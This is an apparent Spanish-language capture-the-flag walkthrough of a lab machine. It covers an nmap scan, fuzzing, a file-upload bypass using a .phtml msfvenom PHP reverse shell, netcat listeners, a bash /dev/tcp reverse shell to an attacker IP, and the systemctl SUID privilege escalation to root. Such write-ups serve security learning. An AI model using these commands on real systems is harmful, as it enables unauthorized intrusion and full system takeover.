
Empezamos con un reconocimiento básico de la red con [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.194.239 -oN ScanPorts.txt`

Encontramos abiertos los puertos `21 FTP`, `22 SSH`, `139 SMB`, `445 SMB`, `3128 Proxy`y `3333 HTTP`

En el puerto `3333` hay un servicio Apache levantado navegamos a el a través del navegador, vamos ha hacer fuzzing usando primero [[DIRBUSTER]]

Encontramos un directorio llamado `/internal` que nos permite subir archivos, vamos a cargar una reverse Shell con extensión `.php` por si nos deja ejecutarla.
Creamos el archivo llamado `shell.php` con [[MSFVENOM]]
`msfvenom -p php/reverse_php LHOST=<IP_local> LPORT=443 raw > shell.php`

La extensión `.php` no esta permitida, vamos a probar con `.phtml`, con esta extension si que nos deja.
También con [[DIRBUSTER]] hemos encontrado la ruta donde se suben los archivos en `/internal/uploads` navegamos a el.

Nos ponemos en escucha con [[NETCAT]] y ejecutamos el archivo
`nc -lvnp 443`

Obtenemos la conexión la aseguramos con otro [[NETCAT]]
`nc -lvnp 444`

Y en el primero nos pasamos la conexión al segundo
`bash -c "sh -i >& /dev/tcp/10.8.28.111/444 0>&1"`

Ahora vamos a hacer [[01. Tratamiento de la TTY]] para trabajar mas cómodamente.
Una vez hecho el tratamiento vamos a buscar por los directorios para ver que información relevante encontramos.

En el directorio `/home` encontramos que existe un usuario `bill` en el esta la primera flag.

Para la escalada de privilegios probamos con `sudo -l` pero no conseguimos ningún resultado así que buscaremos por SUID.
`find / -perm -4000 2>/dev/null`

Encontramos que `/bin/systemctl` se puede explotar así que navegamos a GTFobins para ver su explotación.

Para la escalada de privilegios hay que ejecutar el siguiente comando.
```` shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

````

Una vez ejecutado usaremos `bash -p` y habremos obtenido una bash como root.
